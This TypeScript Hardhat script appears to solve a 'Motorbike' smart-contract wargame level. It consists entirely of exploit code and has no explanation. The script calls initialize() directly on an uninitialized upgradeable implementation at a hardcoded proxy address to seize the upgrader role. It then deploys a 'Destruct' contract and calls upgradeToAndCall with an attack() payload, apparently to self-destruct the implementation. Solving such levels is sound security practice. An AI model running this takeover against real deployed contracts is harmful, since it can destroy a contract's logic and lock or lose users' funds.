import { ethers, upgrades } from "hardhat";
import {Contract, Interface } from "ethers";
import  Motorbike  from "./../artifacts/contracts/Motorbike.sol/Motorbike.json";
import  Engine from "./../artifacts/contracts/Engine.sol/Engine.json";

require("dotenv").config();

let motorbike: Contract;
let engine: Contract;

async function main() {
    const [attacker] = await ethers.getSigners();

    const proxyAdminAddress = "0x7F2E694572fad81e0905f12d7B7AE916b76c4364";
    console.log("Attackers account:", attacker.address);

    motorbike = await ethers.getContractAt(Motorbike.abi, proxyAdminAddress);
    
    
    const currentImplAddress = await upgrades.erc1967.getImplementationAddress(proxyAdminAddress);
    engine = await ethers.getContractAt(Engine.abi, currentImplAddress);
    const upgrader = await engine.upgrader();

    const Destruct = await ethers.getContractFactory("Destruct");
    const destruct = await Destruct.deploy();
    await destruct.waitForDeployment();

    console.log("Implementation: ", currentImplAddress)
    console.log("Implementation upgrader", upgrader);

    let tx = await engine.initialize();
    await tx.wait();

    const iface = new Interface(["function attack()"]);
    const data = iface.encodeFunctionData("attack");

    tx = await engine.upgradeToAndCall(destruct, data);
    await tx.wait();

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});